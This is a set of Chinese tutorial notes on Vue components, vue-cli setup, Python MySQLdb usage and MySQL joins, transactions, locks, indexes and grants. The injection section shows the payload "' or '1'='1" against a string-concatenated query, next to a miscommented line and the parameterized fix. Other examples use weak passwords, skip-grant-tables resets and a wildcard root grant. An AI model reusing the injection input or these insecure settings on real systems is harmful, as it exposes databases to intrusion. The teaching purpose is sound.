组件间的数据传递5.1 父传子1234567891011121314151617181920212223242526272829303132333435363738&lt;div id=&quot;app&quot;&gt; &lt;input type=&quot;text&quot; v-model=&quot;username&quot;&gt; &lt;br&gt; 父组件的值: &#123;&#123;username&#125;&#125; &lt;hr&gt; &lt;!-- 父组件向子组件传递数据: 在子组件的标签上绑定一个属性 :任意属性名=&quot;父组件的变量&quot; --&gt; &lt;app :test=&quot;username&quot;&gt;&lt;/app&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; // 组件1 let app = &#123; template: ` &lt;div&gt; 这是子组件传递的数据: &#123;&#123; test &#125;&#125; &lt;/div&gt; `, // 通过props来接收父组件传递的参数 props: [&#x27;test&#x27;] &#125; // new vue 也是一个特殊的组件 由于组件1直接注册到了组件2 的内部 所以组件2是组件1的父组件 // 组件2 new Vue(&#123; el: &quot;#app&quot;, data: &#123; username: &quot;&quot;, &#125;, components: &#123; app: app, &#125; &#125;)&lt;/script&gt; 1234# 总结 1. 父组件向子组件传递数据的方式是在子组件的标签上绑定一个属性 :任意属性名=&quot;父组件的变量&quot; 2. 父组件传递的值可以在子组件内部通过props接收 3. 尽量不要在子组件的内部修改来自于父组件的值 5.2 子传父 子传父是通过this.$emit(&quot;自定义事件&quot;, &quot;要传递的参数&quot;)来向父组件传递参数 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;div id=&quot;app&quot;&gt; 这是父组件中的username: &#123;&#123;username&#125;&#125; &lt;hr&gt; &lt;!-- 接收子组件传递的自定义事件 并且绑定父组件的方法 --&gt; &lt;com @btn=&quot;clickMe&quot;&gt;&lt;/com&gt;&lt;/div&gt;&lt;script src=&quot;js/vue.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; let com = &#123; template: ` &lt;div&gt; 这是子组件: &lt;button @click=&quot;clickBtn&quot;&gt;按钮&lt;/button&gt; &lt;/div&gt; `, methods: &#123; // 在子组件触发的函数内部提交一个自定义事件 且这个事件要包含传递的参数 clickBtn() &#123; // 向父组件触发一个自定义事件 参数1: 事件名 参数2: 要传递的数据 this.$emit(&quot;btn&quot;, &quot;百知教育&quot;) &#125;, &#125; &#125; new Vue(&#123; el: &quot;#app&quot;, data: &#123; username: &quot;小黑&quot;, &#125;, methods: &#123; clickMe(username) &#123; console.log(username); this.username = username; &#125;, &#125;, components: &#123; com: com, &#125; &#125;)&lt;/script&gt; 6. vue-cli 脚手架6.1 vue-cli的概念 Vue CLI 是一个基于 Vue.js 进行快速开发的完整系统 。使用脚手架可以让我们开发的页面成为一个完整的系统（项目）。脚手架将vue的每个组件都做成了单独的组件 6.2 vue-cli安装6.2.1 环境准备 如果想要安装vue-cli脚手架, 必须先安装好node.js的环境. 1234567891011121314151617181920212223242526# 1. 下载node.js http://nodejs.cn/download/ windows: .msi 安装包(exe)可以指定安装位置 .zip(压缩包) 直接解压可以使用 mac: pkg 安装包直接配置好环境无需操作 # 2. 安装时需要勾选 add to path 如果没有勾选,需要手动配置环境变量 NODE_HOME=&quot;C:\\Program Files\\nodejs;&quot; PATH=&quot;xxxx;%NODE_HOME%&quot; # 3. 验证是否成功 node -v# 4. npm介绍 npm -v 相当于python pip node package manager nodejs的包管理工具 前端主流技术都可以通过npm安装 # 5. 配置npm 淘宝镜像 npm config set registry https://registry.npm.taobao.org # 6. 验证配置环境 npm config ls# 7. 配置npm 下载依赖的位置 npm config set cache &quot;D:\\node_space\\npm_cache&quot; npm config set prefix &quot;D:\\node_space\\npm_global&quot; 作业121. 课堂案例完成2. 安装node","categories":[],"tags":[]},{"title":"","slug":"MySQL_04_Python","date":"2024-10-24T11:20:58.390Z","updated":"2024-10-07T05:20:47.991Z","comments":true,"path":"2024/10/24/MySQL_04_Python/","permalink":"http://example.com/2024/10/24/MySQL_04_Python/","excerpt":"","text":"Python 连接 MySQL一、安装MySQL驱动1、分类 mysql-connector-python - mysql 官方提供，纯python构建 PyMySQL - 开源作者methane和adamchainz 提供，纯python构建 cymysql - fork of pymysql，C构建 mysqlclient - 开源作者methane提供，C构建 mysqldb 不适用于python3 12341. 内置模块 Python自带 --- 不能直接连接MySQL 2. 自定义模块（自己写的） --- 可以但不会写 复杂3. 第三方模块 --- 借助别人写好的代码 开源作者都会把第三方模块上传到Pypi社区，因此我们需要去Pypi社区下载别人写的代码用在自己的项目中 2、安装模块1234567891011三种安装方式：1. pip install mysqlclient 即可。此时它会自动下载相应的文件并安装（需要联网）2. 下载.whl文件 在cmd中执行 pip install mysqlclient-2.0.1-cp36-cp36m-win_amd64.whl 即可。建议直接将xxx.whl文件拖拽到cmd中3. 到Pypi社区，下载压缩包.tar.gz文件，解压，进入解压目录下，在地址栏中输入cmd，执行python setup.py install 安装即可（不推荐）# 注意：# 1. 如果使用pip时，提示 pip不是内部命令 需要配置环境变量（将python安装目录下的scripts目录，添加到系统的环境变量中，重启cmd）# 2. 在使用pip之前，需要更新pip到最新版本 python -m pip install --upgrade pip 1# 使用Pip安装的第三方模块，会被放在python安装目录下的Lib/site-packages目录中，此时只要项目的解释器配置好了，就不需要在每个项目中拷贝mysqldb包，直接在代码中import MySQLdb即可 和 导入内置模块就一样了 12341. pip指令是用于安装python第三方模块的 全称 Python install package2. pip list 查看已安装的第三方模块3. pip install xxx 安装第三方模块4. pip uninstall xxx 卸载第三方模块 二、数据库操作API1、获取连接123456789import MySQLdbconn = MySQLdb.connect( host=&#x27;localhost&#x27;, # mysql所在主机的ip port=3306, # mysql的端口号 user=&quot;root&quot;, # mysql 用户名 password=&quot;123456&quot;, # mysql 的密码 db=&quot;testdb&quot;, # 要使用的库名 charset=&quot;utf8&quot; # 连接中使用的字符集 ) 2、获得Cursor对象1cursor = conn.cursor() # 游标 3、执行SQL123456789101112131415#执行查询语句，返回查询出有多少行row_count = cursor.execute(&quot;select id,name,salary from t_employee where id&gt;5&quot;)id=5row_count = cursor.execute(&quot;select id,name,salary from t_employee where id&gt;&quot;+str(id))#执行增删改，返回影响的行数sql = &quot;insert into t_employee (name,salary,age) values(&#x27;Mr_lee&#x27;,100.33,18)&quot;row_count = cursor.execute(sql)name=&#x27;Mr_lee&#x27;age=18salary=50000sql = &quot;insert into t_employee (name,salary,age) values(&#x27;%s&#x27;,%f,%d)&quot;%(name,salary,age)row_count = cursor.execute(sql) 4、执行查询1234row_count = cursor.execute(&quot;查询的sql语句&quot;) #返回查询到的数据行数，没有数据返回0cursor.fetchone() #在查询出的数据中，获取一条数据cursor.fetchmany(3) #在查询出的数据中，获取3条数据 cursor.fetchall() #获取所有数据 cursor中是所有查到的数据，从中获取数据，需要向下移动游标，游标起始位置是第一行数据上一行 fetchone() 游标下移一行 ，获取一行数据(tuple)，如果没有数据返回None fetchmany(n) 游标下移n行，获取n行数据(tuple of tuple)，如果没有数据返回空tuple：() fetchall() 游标移动到底，获取所有数据行(tuple of tuple)，如果没有数据返回空tuple：() 技巧：有值&#x2F;None 非空tuple&#x2F;空tuple 可以作为 True&#x2F;False使用 ，判断是否查询到了数据 从cursor中获取的每一行数据的格式为一个tuple，其中是各列的值 数据表中的列类型和python类型的对应为： int &#x3D;&#x3D; int double&#x2F;float &#x3D; float varchar&#x2F;char &#x3D;&#x3D; str decimal &#x3D;&#x3D; decimal.Decimal datetime &#x3D;&#x3D; datetime.datetime 5、执行增删改1count = cursor.execute(&quot;增删改的sql语句&quot;) 返回影响的行数 执行增删改需要控制事务，提交或回滚事务 12conn.commit() 提交conn.rollback() 回滚 6、资源回收123456cursor.close() #先关闭cursorconn.close() #后关闭connconn.commit()cursor.close()conn.close() 7、cursor类型选择1234567cursor = conn.cursor(MySQLdb.cursors.DictCursor) #选择了cursor类型cursor.execute(sql)#&#123;&#x27;id&#x27;: 1, &#x27;name&#x27;: &#x27;Mr_lee&#x27;, &#x27;birth&#x27;: datetime.datetime(2018, 4, 24, 21, 26, 3)&#125;cursor.fetchone() #此时返回的不再是tuple，而是一个dict，key是列名，value是列值cursor.fetchall()/fetchmany() #返回 tuple of dict，每个dict是一行数据 12345678# 总结Python操作Mysql的步骤： 1. 连接mysql conn = MySQLdb.connect(xxx) 2. 获取游标对象 conn.cursor(游标的类型) 3. 执行SQL语句 -- 指令可以是 增删改查 cursor.execute(&quot;SQL语句&quot;) 4. 根据SQL指令的不同，需要做不同的操作 如果是查询指令：cursor.fetchone/fetchmany/fetchall 如果是增删改指令：conn.commit() 5. 释放资源 关闭curse和conn 三、SQL中传递参数1、SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，攻击站点，达到入侵目的。 12345name=&quot;&#x27; or &#x27;1&#x27;=&#x27;1&quot;sql = &quot;select id,name,age from user where name=&#x27;%s&#x27;&quot; % name # name = &#x27;&#x27; or &#x27;1&#x27;=&#x27;1&#x27;total = cursor.execute(sql3) #此时执行sql，可以防止sql注入出现如上问题，根源：sql语句有字符串拼接 防止 123name=&quot;&#x27; or &#x27;1&#x27;=&#x27;1&quot;sql = &quot;select id,name,age from user where name=%s&quot;total = cursor.execute(sql,[name]) #此时执行sql，其中的参数内容会转义为没有sql语义的片段，可以防止sql注入 2、传递参数用 %s 或 %(key)s 做占位符，接收参数 12345sql = &quot;select id,name,age from test where name=%s and id&gt;%s&quot; #%s 做占位符total = cursor.execute(sql ，[&quot;Mr_lee&quot; ，1] ) #列表sql = &quot;insert into test(name,age) values(%s,%s)&quot; #%s 做占位符total = cursor.execute(sql ，（&quot;Mr_lee&quot; ，18） ) #元组 1234# %(key)s 做占位符sql = &quot;select id,name,age from test where name=%(name)s and id&gt;%(id)s&quot; total = cursor.execute(sql , &#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Mr_lee&quot;&#125; ) #dict 总结：在执行带参数的sql语句时，使用cursor.execute(sql,[name]) ,防止sql注入的攻击","categories":[],"tags":[]},{"title":"","slug":"MySQL_02","date":"2024-10-24T11:20:58.387Z","updated":"2024-10-07T05:20:49.061Z","comments":true,"path":"2024/10/24/MySQL_02/","permalink":"http://example.com/2024/10/24/MySQL_02/","excerpt":"","text":"MySQL_02一、表连接1、概述两张表或多张表联合查询，共同提供数据，最终得出结果。 用户表和订单表 员工表和部门表 本章节我们将向大家介绍如何使用 MySQL 的 JOIN 在两个或多个表中查询数据。 2、表连接使用2.1 连接方式 内连接 inner join 数据必须一一对应 不会出现null数据 外连接 左外连接 left outer join 左表优先 左表数据全显 右表无数据显示null 右外连接 right outer join 右表优先 右表数据全显 左表无数据显示null 自连接 多用于类别表 ，不区分连接方式，只不过是 连接的双方是同一张表而已 2.2 内连接语法： 12select ... from 表1 as 别名1 inner join 表2 as 别名2 on 别名1.列名 = 别名2.列名 -- on表示连接条件 -- 使用示例： 查询员工的信息和所在部门的名称 1select t1.*,t2.title from t_employee as t1 inner join t_department as t2 on t1.dept_id = t2.id; 内连接的 ‘inner’ 可省略为 ‘join‘ 技巧：在表连接时，为各个表，定义别名，防止列名命名冲突 2.3 表连接执行过程 如果是 A inner join B则A为主表，B为从表 主表中的任何一条数据，都要试图和B中的每一行取连接，是否能够真正连接，取决于on是否被满足 on条件满足后，主从双方将自己对应的行，放入最终的大表中 2.4 外连接 如上将 ‘inner join’ 换成 ‘right outer join’ 换成‘left outer join’ 即是右外连接 或 左外连接。 其中外连接的 ‘outer’ 可以省略为 ‘left&#x2F;ritht join’ 2.5 外连接与内连接的区别 外连接：左外连接的左表（主表），右外连接的右表（主表） 数据全显，如果没有对方数据，用null填充。 内连接：只有存在匹配数据的数据才会显示在最终结果中。 2.6 自连接自连接即自己连接自己，多用于类别表中 12345678select t1.id,t1.level,t1.title,t2.title,t2.levelfrom t_cate t1JOIN t_cate t2ON t1.id=t2.parent_id 2.7 多表连接示例：员工、部门、地区 查询所有员工的信息及所在部门的信息和部门所在的地区的信息 123456789101112SELECT emp.*,dept.*,loc.*FROM t_employee empleft JOIN t_department depton emp.dept_id = dept.idright JOIN t_location locon loc.id = dept.loc_id; 二、建表操作1、数据类型 数字类型 类型名称 大小 用途 tinyint 1字节 极小整数值 smallint 2字节 -32768 32767 小整数值 mediumint 3字节 大整数值 int或integer 4字节 -2147483648 2147483647 大整数值 bigint 8字节 极大整数值 float 4字节 单精度 浮点数值 double 8字节 双精度 浮点数值 decimal decimal(m,n) 无固定大小 decimal(8,3) 小数值 字符类型 类型名称 大小 用途 char 0-255字节 定长字符串 char(10) 固定占用10字节 varchar 0-65535字节 变长字符串 varchar(20) 表示最大长度 tinyblob 0-255字节 不超过255个字符的二进制字符串 tinytext 0-255字节 短文本字符串 blob 0-65535字节 二进制形式的长文本数据 text 0-65535字节 长文本数据 mediumblob 0-16777215字节 二进制形式的中等长度文本数据 mediumtext 0-16777215字节 中等长度文本数据 longblob 0-4294967295字节 二进制形式的极大文本数据 longtext 0-4294967295字节 极大文本数据 日期和时间类型 类型名称 格式 用途 DATE YYYY-MM-DD 日期 TIME HH:MM:SS 时间 DATETIME YYYY-MM-DD HH:MM:SS 混合日期和时间 TIMESTAMP YYYY-MM-DD HH:MM:SS 混合日期和时间，时间戳 2、列约束用于对表中的列作出修饰： primary key 主键 – 唯一标记数据库表中的一条记录 不能重复 + 非空 not null 非空 null 可空 （默认是可空） unique 唯一 12345create table userlist ( id int primary key auto_increment, name varchar(20) not null unique, ...) 3、列选项 auto_increment 自增长，一般用在主键维护上，默认从1开始 default 列的默认值，插入数据时列的缺省值 123456create table userlist ( id int primary key,auto_increment, name varchar(20) default &#x27;jingjing&#x27;, age tinyint default 18, ...) 4、表选项 engine 引擎选择–一般使用innodb default charset 表中的数据的编码格式 1、建库最好选择字符集为utf8 建表时将会继承库的字符集 2、如果建库时没有选择字符集，则建表必须设置字符集，否则会出现中文乱码 3、建议将my.ini配置文件中的字符集更改为utf8 则数据库将会继承配置中的字符集 auto_increment 自增长列的起始值 123456789101112131415create table user9( id int auto_increment primary key, name varchar(20) NOT NULL DEFAULT &#x27;Mr_lee&#x27;, nick varchar(15) UNIQUE, birth timestamp)ENGINE = InnoDB default charset = utf8 auto_increment = 9;create table user10( id int auto_increment , name varchar(20) NOT NULL DEFAULT &#x27;Mr_lee&#x27;, nick varchar(15), birth timestamp, primary key(id), #表级约束 unique(nick) #表级约束)ENGINE = InnoDB default charset = utf8 auto_increment = 9; 5、联合约束12345678create table t_user( id int auto_increment, name varchar(20), age tinyint, nick varchar(20), primary key(id,name), # id 和 name的组合作为联合主键 unique(age,nick) # age 和 nick 的组合不能重复)ENGINE = InnoDB default charset = utf8; 删除表：drop table 表名; 三、操作表中的数据1、插入数据语法： 12INSERT INTO table_name ( field1, field2,...fieldN ) VALUES ( value1, value2,...valueN ); 插入数据： 1insert into user9 (id,name,nick,birthday) values (1,&#x27;Mr_lee&#x27;,&#x27;zz&#x27;,&#x27;2000-01-01&#x27;) 注意：values前后两个括号中的值 数量要一致 主键是自动增长，mysql自动填充值,不建议认为指定id的值！！！ 1insert into user9 (name,nick,birthday) values (&#x27;Mr_lee&#x27;,&#x27;zz22&#x27;,&#x27;2000-01-01&#x27;) 一次插入多条数据 123insert into user9 (name,nick,birthday) values (&#x27;Mr_lee&#x27;,&#x27;zz22&#x27;,&#x27;2000-01-01&#x27;), (&#x27;Mr_lee&#x27;,&#x27;zz33&#x27;,&#x27;2000-01-01&#x27;), (&#x27;Mr_lee&#x27;,&#x27;zz44&#x27;,&#x27;2000-01-01&#x27;) 省略列名插入，要求values中必须是完整的列对应的值 1insert into user9 values (1,&#x27;Mr_lee&#x27;,&#x27;zz&#x27;,&#x27;2000-01-01&#x27;) 2、更新数据语法： 1UPDATE table_name set field1=new_value1,field2=new_value2 ... where ... 注意：更新数据时务必指定where条件，否则将会影响所有行的值。 更新id为1的用户的姓名为Mr_lee 1update user9 set name=&#x27;Mr_lee&#x27; where id=1; 更新所有人的姓名（慎用） 1update user9 set name=&#x27;Mr_lee&#x27; ; 3、删除数据语法： 1delete from table_name where ..; 删除所有数据 - 慎用 1delete from user9; 删除birthday是2018&#x2F;12&#x2F;12的用户 1delete from user9 where birthday = &#x27;2018/12/12&#x27;","categories":[],"tags":[]},{"title":"","slug":"MySQL_03","date":"2024-10-24T11:20:58.387Z","updated":"2024-10-07T05:20:47.945Z","comments":true,"path":"2024/10/24/MySQL_03/","permalink":"http://example.com/2024/10/24/MySQL_03/","excerpt":"","text":"MySQL_03一、关联关系1、概述在实际的项目开发中，会有很多数据表，而且表之间不是孤立的，是存在关联关系的。关联关系的搭建是通过 外键 完成的。 设计部门表和员工表 （部门包含员工，员工从属于部门）。 1234# 加强员工表和部门表之间的关联关系：1. 建表时，就要能够看出这两个表之间的关系2. 员工的dept_id的取值应该限制在部门表中的某一个id范围内，不能超出这个范围# 如何实现上述的需求：外键 2、外键使用外键语法： 12FOREIGN KEY(自己的列名) REFERENCES 对方表名（对方主键名） dept_id t_department(id) 示例 1234567891011create table t_department( id int auto_increment primary key, ...)ENGINE InnoDB default charset utf8;create table t_employee( id int auto_increment primary key, ... dept_id int, FOREIGN key(dept_id) REFERENCES t_department(id) # 约束外键的值只能是t_department表中已存在的id值)ENGINE InnoDB default charset utf8; 外键列的类型要和对方主键列类型保持一致 外键列中的值必须是对方主键列中值的子集 插入数据时先插入主表 (主从关系：员工是属于部门，部门包含员工) 删除 数据时先删除从表 (ops:有外键的一方为从表) 3、关系种类3.1 一对一12345678910111213141516-- 外键 + 唯一 -- create table person( id int primary key auto_increment, name varchar(20) unique, age tinyint,)ENGINE=INNODB DEFAULT CHARSET=utf8;create table passport( id int primary key auto_increment, note varchar(20), expire TINYINT not null, persion_id int, FOREIGN KEY(person_id) REFERENCES person(id), #外键 unique(persion_id) #唯一)ENGINE=INNODB DEFAULT CHARSET=utf8 auto_increment=10000; 3.2 一对多12# 一对多关系中，外键是放在多的这一方，员工表中# 或 应该把外键放在从表放 1234567891011121314-- 外键 --create table t_department( 1 id int primary key auto_increment, title varchar(20) unique, note varchar(20))ENGINE=INNODB DEFAULT CHARSET=utf8;create table t_employee( * id int primary key auto_increment, name varchar(20) unique, age TINYINT not null, dept_id int not null, FOREIGN KEY(dept_id) REFERENCES t_department(id))ENGINE=INNODB DEFAULT CHARSET=utf8 auto_increment=10000; 3.3 多对多12345678910111213141516171819202122-- 第三方表+双外键+联合主键 --create table student( id int PRIMARY key auto_increment, name varchar(20), age TINYINT)ENGINE=INNODB DEFAULT CHARSET=utf8 auto_increment=10000;create table course( id int PRIMARY key auto_increment, title varchar(20) unique, expire TINYINT)ENGINE=INNODB DEFAULT CHARSET=utf8 auto_increment=10000;-- 第三方表 关系表create table relation( student_id int, course_id int, FOREIGN KEY(student_id) REFERENCES student(id), FOREIGN KEY(course_id) REFERENCES course(id), PRIMARY key(student_id,course_id))ENGINE=INNODB DEFAULT CHARSET=utf8 auto_increment=10000; 二、事务123451. 现实生活中事务： 一件事情 吃饭： 从教室 -&gt; 食堂 -&gt; 排队 -&gt; 打饭 -&gt; 付钱 -&gt; 找地 -&gt; 吃 -&gt; 回收 -&gt; 回到教室 所有的步骤全部完成，才认为吃饭这件事完成了2. MySQL中的事务： 在一个复杂业务处理过程中，会有多次数据操作，数据操作全部完成才意味业务（事务）的完成 1、概念 在一个复杂的业务处理中，会有复杂的多次的数据操作，这些操作全部成功才意味着业务的完成。但是如果其中的某一步数据通信出错，那整个业务也就失败。 1234567# 转帐：A -&gt; B 300A: 1000B: 01. A账户： 1000-300 = 7002. B账户： 0 + 300 = 300如果转账的过程，某一步出错，需要回退数据，否则会出现数据不一致的情况 保证一个业务中的诸多数据操作一旦有任何一处的出错可以立即全盘回退，使数据库不出现非法数据，至关重要！ 我们把多个数据操作打包成一个事务，事务内的所有操作，要么都成功，要么全盘回滚。 1# 事务的目的：为了保证数据库中的数据的完整性（一致性） 2、事务的使用 表选项中使用InnoDB引擎，支持事务 事务如何开启 begin; 语句执行，会开启一个事务 start transaction; 语句执行，也可以开启一个事务 事务如何，何时结束 commit; 语句执行，事务提交 – 如果事务处理的过程中遇到错误，MySQL会自动回滚数据。 rollback; 语句执行，事务回滚（手动回滚，由程序员决定什么时候需要回滚数据，以及是否需要回滚） 细节：如果事务内部，出现了数据操作失败，自动回滚。如果需要手动回滚，可以执行：rollback; 12345begin;insert into order10(price,note,user_id) values(123.55,&#x27;zzz&#x27;,1);commit;或者rollback; 3、事务的特性ACID Atomicity（原子性）：一个事务是一个不可分割的工作单位，事务中包括的诸多操作要么都做，要么都不做。A-300 B+300 Consistency（一致性）：事务的干涉下，数据库总是从一个一致性的状态转换到另一个一致性的状态，数据的逻辑是完整和正确的。 Isolation（隔离性）：一个事务中的数据，对其他事务是隔离的。 Durability（持久性）：事务一旦提交，处理结束后，事务中的数据就持久化到数据库中。 4、事务并发问题 脏读：事务A读取到了事务B中的数据，但是事务B回滚了或再次更新了数据，事务A读取到的为脏数据（一个事务读取了另一个未提交的事务中的数据） A开启了事务，读数据，此时B更新了数据，但未提交，此时A再读数据，读到的就是脏数据。dirty data 不可重复读：事务A多次读取同一数据的过程中，事务B更新了此数据并提交了事务，则事务A多次读取到不同的数据(一个事物内多次读取同一数据，但是结果不一致) A开启了事务，读数据，此时B更新了数据并提交了事务，此时A再读数据，读到的不一致。 幻影读：事务A多次读取同一张表的数据的过程中，事务B更新了表中的数据(增加或删除)，则事务A发现出现了莫名其妙的额外的数据。 一个事务多次查询，数据行数不一致 (在低于 ‘repeatable-read中出现’) 一个事务通过一次查询的结果，决定可以添加一个不重复的数据，但实际添加时却发现表中已有数据重复 (在低于‘serializable’中出现) 更新丢失：后续解释 12345678910#总结： - 脏读与不可重复读的区别： - 脏读是B事务更新但未提交事务 - 不可重复读：B事务更新并提交了事务，A多次读到的数据不一致 - 幻影读与脏读和不可重复读的区别： - 幻影读是对数据行的增加或删除 - 脏读和不可重复读是对数据内容的修改 5、事务隔离级别 获取当前数据库的隔离级别，mysql的默认隔离级别为repeatable-read 可重复读 ​ select @@tx_isolation; 设置隔离级别 ​ set session transaction isolation level read uncommitted; ​ set session transaction isolation level read committed; ​ set session transaction isolation level repeatable read; ​ set session transaction isolation level serializable; 事务隔离级别 脏读 不可重复读 幻读 读未提交（read-uncommitted） 是 是 是 读提交（read-committed） 否 是 是 可重复读（repeatable-read） 否 否 是 串行化（serializable） 否 否 否 隔离级别由低到高，安全性逐渐加强，并发性能逐渐降低 6、锁更新丢失：当两个或多个事务选择同一行数据，然后基于最初选定的值更新该行时，由于每个事务都不知道其他事务的存在，就会发生丢失更新问题 －－最后的更新覆盖了由其他事务所做的更新。 增删改语句，会自动对所操作的数据行，加锁。其他事务如果也要增删改相同的数据行，会被阻塞。 拥有锁的事务，在事务结束时，释放锁 基于事务并发中的 ”更新丢失“展开讨论 场景：大量的事务并发，而且，操作相同的数据 悲观锁： select xxx from xx for update; 行级锁，排它锁 乐观锁：在数据中新增一列 version 记录数据更新的版本。并不是真正的锁 123456789101112131415t_user: id name age 1 Mr_lee 18 tx1:age+1 1&gt;select age from t_user where id=1; age=18 3&gt;update t_user set age=(18+1) where id=1; commit; age=19tx2:age+2 2&gt;select age from t_user where id=1; age=18 4&gt;update t_user set age=(18+2) where id=1; commit; age=20 -- 出现如上问题，根本原因是：查询操作不互斥，即查询动作不会对操作的数据加锁(ops:增删改会对操作的数据加锁) 12345678910111213-- 悲观锁：tx1:age++ 1&gt;select age from t_user where id=1 for update; #此时会对数据加锁 age=18 2&gt;update t_user set age=18+1 where id=1; commit; age=19 tx2:age+2 3&gt;select age from t_user where id=1 for update; #此时会对数据加锁 age=19; 4&gt;update t_user set age=19+2 where id=1; commit; age=21 123456789101112131415-- 乐观‘锁’t_user id name age version 1 Mr_lee 18 0tx1:age+1 1&gt;select age,version from t_user where id=1; age=18;version=0; 3&gt;update t_user set age=18+1,version=0+1 where id=1 and version=0; commit; age=19;version=1tx2:age+2 2&gt;select age,version from t_user where id=1; age=18;version=0; 4&gt;update t_user set age=18+2,version=0+1 where id=1 and version=0; commit; -- 未更新到数据行 三、索引1、索引作用在查询数据表时，默认会从第一行数据依次查到最后一行。所以当数据量较多时，查询很耗时。如果作为查询条件的列有索引，就可以不必遍历每一条数据，就可以很快找到数据。 select * from t_user where age = 18 2、创建索引 表中的主键列和外键列 和唯一列自动有索引 2.1 单列索引12345678create table t_user( id int primary key, name varchar(20), index name_ind (name) # select * from t_user where age = 18;); 或者create index ind_name on t_user(name);*细节：主键列，外键列，唯一列 自带索引 如此，再以name为条件查询时，速度会有很大提升 select .. from .. where name = &#39;xxx&#39; 2.2 联合索引1create index name_birth_ind on test3(name,birthday); select .. from .. where name &#x3D; ‘Mr_lee’ and birthday &#x3D; ‘2018&#x2F;12&#x2F;12’ 用and拼接的多个条件，此时如果有联合索引则会对查询效率有极大促进 如果单独对name和birthday两列分别做索引，则因为每次查询时只能用一个索引，不如联合索引效率高 2.3 删除索引1drop index name_ind on t_user; 2.4 查看索引1show index from t_user; 2.5 索引特性 对查询有增益，使查询速度加快 对于增删改会有额外的索引维护的时间消耗 索引不是越多越好 对于修改较多的表，不适合做过多索引 对于查询较多的表，在作为查询条件的列上做索引，提高查询效率 盲目建索引，不仅增加大量的索引维护时间，而且也是对存储空间的严重侵蚀 四、SQL分类 数据查询语言DQL（Data Query Language）：select、where、order by、group by、having。 数据定义语言DDL（Data Definition Language）：create、alter、drop。 数据操作语言DML（DataManipulation Language）：insert、update、delete 。 事务处理语言TPL（Transaction Process Language）：commit、rollback 。数据控制语言DCL（Data Control Language）：grant、revoke。 grant all privileges on *.* to ‘root‘@’%’ identified by ‘222222’ with grant option; 所有特权 库.表 用户名@host 密码 允许将特权授权给他人 flush privileges; #刷新特权，使生效","categories":[],"tags":[]},{"title":"","slug":"MySQL_01","date":"2024-10-24T11:20:58.385Z","updated":"2024-10-07T05:20:49.306Z","comments":true,"path":"2024/10/24/MySQL_01/","permalink":"http://example.com/2024/10/24/MySQL_01/","excerpt":"","text":"一、简介1、概述 MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。 1234# 1. MySQL是一个数据库，数据的仓库，用于存储数据，存储程序中的数据（注册时的用户名、密码、邮箱等、网站上的数据-当当网用户的信息、商品的信息） 数据库泄露 xx 目的：持久化存储 用户和密码 # 2. Oracle公司：收购了MySQL -自己也有一款数据库：oracle MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件。 MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。 MySQL系统结构是 “库” “表” “行” “列”，每个库中有多张表，每张表中有多个行，每个行中有多个列。 12# 1. MySQL结构是由库、表、行、列来组成的# 2. MySQL是一个大的数据仓库，在大仓库中又分了很多个小库（每个库都有一个名字），在每个小库中又包含了很多个表，而每个表中又有很多个行和列 2、安装（1）在 MySQL 下载中下载 Windows 版本的 MySQL 安装包 （2）双击安装并配置环境变量 ​ 手动配置环境变量： 右击计算机–属性-高级系统设置-环境变量-系统环境变量-path : 加入 mysql安装目录下的bin路径：D:\\Software\\MySQL Server 5.5\\bin （3）检查是否安装成功 （打开Dos窗口） 1mysqladmin --version //查看Mysql服务器版本 12345678# 安装步骤：1. 双击&lt;mysql-5.5.60-winx64.msi&gt;安装包，下一步， 选择custom自定义安装，修改安装位置（切记：不要有中文路径）2. 配置环境变量： add bin directory to windows path 自己决定是否勾选3. 设置root密码，不要过于复杂，建议使用1234564. 最后一步时，确保前三个是勾，如果只有两个勾，需要使用geek卸载，删除注册表，重启电脑再重新安装 3、密码设置3.1 设置初始密码（跳过）1mysqladmin -u root password &quot;123456&quot; #安装过程中设置过密码 则可跳过 3.2 修改密码1mysqladmin -u用户名 -p旧密码 password 新密码 3.3 重置root密码123456781. 关闭正在运行的MySQL服务。 net stop mysql2. 打开DOS窗口，转到mysql\\bin目录 -- 如果配置了环境变量，则该步骤可以跳过。 3. 输入mysqld --skip-grant-tables 回车。--skip-grant-tables 的意思是启动MySQL服务的时候跳过权限表认证。4. 再开一个DOS窗口（因为刚才那个DOS窗口已经不能动了），输入mysql回车，如果成功，将出现MySQL提示符 &gt;。5. 连接权限数据库： use mysql; 。6. 改密码：update user set password=password(&quot;新密码&quot;) where user=&quot;root&quot;;（别忘了最后加分号） 。7. 刷新权限（必须步骤）：flush privileges; 。8. 退出 quit。 4、登录和退出4.1 登录mysql1mysql -uroot -p123456 #在dos窗口中操作 4.2 退出mysql1mysql&gt; quit; #在mysql的交互式界面中 二、数据库管理1、显示所有的数据库1mysql&gt; show databases; 2、创建数据库1mysql&gt; create database 数据库名 charset=utf8; #万国码 解决中文乱码 3、删除数据库1mysql&gt; drop database 数据库名; 4、选择数据库&#x2F;查看当前选中的库123mysql&gt; use db_name; //使用某个数据库mysql&gt; select database(); //查看当前选中的数据库 5、显示数据库中的表1mysql&gt; show tables; 三、简单建表操作1、创建表12mysql&gt; create table 表名(列名1 数据类型 约束...，列名2...) # create table t_user(id int auto_increment,name varchar(20)) 2、简单数据类型12345int / integer 整数varchar(n) 字符，n是字符长度datetime 日期 3、简单约束1234567auto_increment 自动增长 由mysql自动维护(插入值时，可以不用给值) 默认从1开始primary key 主键 唯一标识数据库表中的每条记录 不重复且非空 primary key == unique + not nullnot null 非空unique 唯一 但可以为空 4、简单示例12345mysql&gt; create database userDB charset=utf8;mysql&gt; use userDB;mysql&gt; create table t_user (id int auto_increment primary key,name varchar(20) not null ,age int,birthday datetime); 查看表结构 1mysql&gt; desc table_name; # desc -- description 插入数据 1insert into t_user(name,age,birthday) values(&quot;Mr_lee&quot;,18,&quot;2000-07-11&quot;); 查询数据 1select * from t_user; -- 表示所有列 也可以查询指定列 